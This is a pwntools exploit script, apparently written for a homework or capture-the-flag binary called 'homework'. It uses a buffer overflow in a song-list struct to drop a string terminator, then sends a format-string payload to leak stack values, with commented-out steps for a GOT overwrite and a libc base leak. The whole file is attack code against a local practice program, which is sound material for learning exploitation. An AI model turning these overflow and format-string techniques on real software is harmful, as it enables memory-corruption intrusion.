from pwn import *

def select_option(option):
    p.recvuntil(b"[4]: ")
    p.sendline(str(option).encode())

def register_user(username, password):
    select_option(0) 
    p.recvuntil(b"username: ")
    p.sendline(username)
    p.recvuntil(b"password: ")
    p.sendline(password)

def login(username, password):
    select_option(1)
    p.recvuntil(b"username: ")
    p.sendline(username)
    p.recvuntil(b"password: ")
    p.sendline(password)

def add_song(title, artist, album, broken = False):
    if not broken:
        select_option(2) 
    p.recvuntil(b"title: ")
    p.sendline(title)
    p.recvuntil(b"from: ")
    p.sendline(artist)
    p.recvuntil(b"on: ")
    p.sendline(album)
    

def print_favorites():
    select_option(3)
    p.recvuntil(b"[4]: ")
    print("It worked!")
    
def leak(payload):
    p.sendline(payload)
    return p.recv()

exe = ELF(args.EXE or './homework')

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
p = process([exe.path])
#gdb.attach(p, '''break main''')

# run the exploit
# register and login
username = b"user1"
password = b"pass1"
register_user(username, password)
login(username, password)

# add exploit string to list of fav songs
#format_string = FmtStr(execute_fmt=leak)
#context.log_level = 'debug'

# use buffer overflow in last element of struct (no "\0" character to end string -> read into next element)
payload = b"A" * 0x20
add_song(b"song", b"artist", payload)

# add invalid element -> read via buffer overflow
#fmt = FmtStr(execute_fmt=leak)
#print(fmt.offset)
#puts_got = exe.got['puts']
#payload = fmtstr_payload(pwnlib.fmtstr.FmtStr, { puts_got: b"%7$s" }) + p64(puts_got)

attack_payload = b"Exploit works: %x %x %x %x"
add_song(attack_payload, b"artist", b"album", broken=True)

#libc = ELF("./libc.so.6")
#libc_base = leaked_puts - libc.symbols['puts']

print_favorites()

#p.interactive()
